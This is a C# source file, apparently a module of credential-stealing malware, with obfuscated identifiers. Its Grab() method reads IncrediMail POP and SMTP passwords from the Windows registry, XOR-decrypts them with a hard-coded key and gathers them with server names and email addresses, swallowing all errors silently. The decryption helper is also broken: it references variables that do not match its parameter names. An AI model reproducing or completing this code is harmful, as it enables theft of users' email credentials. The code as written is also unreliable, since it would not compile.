using System;
using System.Collections.Generic;
using System.Text;
using C6Zy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class IncrediMail : EtbH
	{
		public IncrediMail()
		{
			this.REC = "IncrediMail";
		}
		public string REC { get; set; }

	public List<WTitxI2m> Grab()
	{
		byte[] key = new byte[] { 185, 2, 250, 1 };

		// 가져올 레지스트리 값 이름
		string[] passwordKeys = { "PopPassword", "SmtpPassword" };

		List<WTitxI2m> accounts = new List<WTitxI2m>();

		try
		{
			RegistryKey identitiesKey = Registry.CurrentUser.OpenSubKey(@"Software\IncrediMail\Identities\");
			if (identitiesKey != null)
			{
				foreach (string identity in identitiesKey.GetSubKeyNames())
				{
					using (RegistryKey accountsKey = identitiesKey.OpenSubKey(identity + @"\Accounts_New"))
					{
						foreach (string accountName in accountsKey.GetSubKeyNames())
						{
							using (RegistryKey accountKey = accountsKey.OpenSubKey(accountName))
							{
								if (accountKey.GetValue("PopPassword") != null || accountKey.GetValue("SmtpPassword") != null)
								{
									string decryptedPassword = null;

									// PopPassword, SmtpPassword 복호화
									foreach (string pwKey in passwordKeys)
									{
										if (accountKey.GetValue(pwKey) != null)
										{
											byte[] encryptedBytes = (byte[])accountKey.GetValue(pwKey);
											if (encryptedBytes.Length > 1)
											{
												decryptedPassword = Encoding.UTF8.GetString(
													IncrediMail.BNTwpn(encryptedBytes, key) 
												);
											}
										}
									}

									accounts.Add(new WTitxI2m
									{
										data1 = ((string)accountKey.GetValue("SmtpServer")).TrimEnd('\0'),
										data2 = ((string)accountKey.GetValue("EmailAddress")).TrimEnd('\0'),
										data3 = decryptedPassword?.TrimEnd('\0'),
										data4 = this.REC
									});
								}
							}
						}
					}
				}
			}
		}
		catch
		{
		}

		return accounts;
	}

	private static byte[] BNTwpn(byte[] yeDipXVO80k, byte[] apyIz)
		{
		byte[] result = new byte[data.Length];

		for (int i = 0; i < data.Length; i++)
		{
			result[i] = (byte)(data[i] ^ key[i % key.Length]);
		}

		return result;
	}
}
